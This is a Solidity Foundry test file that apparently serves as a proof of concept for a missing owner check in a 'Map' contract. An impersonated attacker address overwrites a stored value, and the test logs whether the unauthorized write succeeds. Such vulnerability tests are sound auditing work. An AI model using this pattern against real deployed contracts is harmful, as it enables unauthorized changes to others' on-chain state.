// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/mapping_write.sol";

contract MapTest is Test {
    Map public mapContract;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    uint256 existingKey = 0; // Using initialized key

    function setUp() public {
        vm.prank(owner);
        mapContract = new Map();
        // Initialize test key
        mapContract.set(existingKey, 123);
    }

    function testNonOwnerCanModifyMap() public {
        uint256 maliciousValue = 999; // Value to set

        console2.log("--- BEFORE-Trigger State ---");
        uint256 valueBefore = mapContract.get(existingKey);
        uint256 totalOperationsBefore = mapContract.totalStorageOperations();
        uint256 userOperationsBefore = mapContract.userStorageCount(attacker);
        console2.log("Key %s value: %s", existingKey, valueBefore);
        console2.log("Total storage operations: %s", totalOperationsBefore);
        console2.log("Attacker storage operations: %s", userOperationsBefore);

        console2.log("--- Trigger: Non-owner modifies map ---");
        vm.prank(attacker);
        mapContract.set(existingKey, maliciousValue);

        console2.log("--- AFTER-Trigger State ---");
        uint256 valueAfter = mapContract.get(existingKey);
        uint256 totalOperationsAfter = mapContract.totalStorageOperations();
        uint256 userOperationsAfter = mapContract.userStorageCount(attacker);
        console2.log("Key %s value: %s", existingKey, valueAfter);
        console2.log("Total storage operations: %s", totalOperationsAfter);
        console2.log("Attacker storage operations: %s", userOperationsAfter);

        bool valueChanged = (valueAfter == maliciousValue);
        bool totalOpsIncreased = (totalOperationsAfter == totalOperationsBefore + 1);
        bool userOpsIncreased = (userOperationsAfter == userOperationsBefore + 1);

        console2.log("--- Comparison Verdict ---");
        console2.log("Value changed: %s", valueChanged ? "YES" : "NO");
        console2.log("Total operations increased: %s", totalOpsIncreased ? "YES" : "NO");
        console2.log("User operations increased: %s", userOpsIncreased ? "YES" : "NO");

        // Final vulnerability verdict
        if (valueChanged && totalOpsIncreased && userOpsIncreased) {
            console2.log("Vulnerability Exists: Non-owner successfully modified contract state");
        } else {
            console2.log("Vulnerability not Exist: State remains unchanged or invalid operation count");
        }
    }
}